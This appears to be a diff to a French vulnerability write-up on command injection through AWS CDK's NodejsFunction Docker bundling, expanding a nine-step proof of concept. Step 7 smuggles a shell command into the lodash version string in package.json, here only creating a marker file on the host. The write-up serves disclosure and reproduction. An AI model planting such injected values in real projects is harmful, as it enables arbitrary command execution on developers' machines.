@@ -82,7 +82,7 @@ echo '{\"dependencies\":{\"lodash\":\"4.17.21' && \
 
 **Rejouer / exploiter (dérivé de la source) :**
 - Prérequis : Node.js, npm et Docker installés ; un projet CDK avec `NodejsFunction` en `forceDockerBundling: true` et `bundling.nodeModules`.
-- Étapes : 1. créer le projet (`npm init -y`, installer `aws-cdk-lib constructs aws-cdk typescript ts-node @types/node lodash`) 2. créer `app.ts` avec `bundling: { forceDockerBundling: true, nodeModules: ['lodash'] }` 3. mettre le payload dans la version de `lodash` dans `package.json` 4. `npx cdk synth` 5. vérifier sur l'hôte : `ls -la pwned_via_json.txt`.
+- Étapes (PoC source, étapes 1 à 9) : 1. `mkdir cdk_poc_oscommand && cd … && npm init -y` 2. installer `aws-cdk-lib constructs aws-cdk typescript ts-node @types/node lodash` 3. créer `tsconfig.json` (es2020 / commonjs / `outDir: dist`) 4. créer `cdk.json` (`"app": "npx ts-node app.ts"`) 5. créer `lambda/handler.js` (`exports.handler = async function() { return "OK"; }`) 6. créer `app.ts` avec un `NodejsFunction` en `forceDockerBundling: true` et `nodeModules: ['lodash']`, `entry` pointant sur `lambda/handler.js` 7. mettre le payload dans la version de `lodash` de `package.json` (`4.17.21' && touch /asset-input/pwned_via_json.txt && echo '`) 8. `npx cdk synth` 9. vérifier sur l'hôte : `ls -la pwned_via_json.txt` (Windows : `Test-Path pwned_via_json.txt`).
 - Pièges / limites : `forceDockerBundling` + `nodeModules` requis ; les commandes s'exécutent dans le conteneur mais écrivent sur l'hôte via bind mounts ; la commande générée casse le JSON au passage, sans empêcher l'exécution.
 
 **Reproductibilité :** haute — PoC complet (code, payload, commandes), outils publics, cible locale Docker.
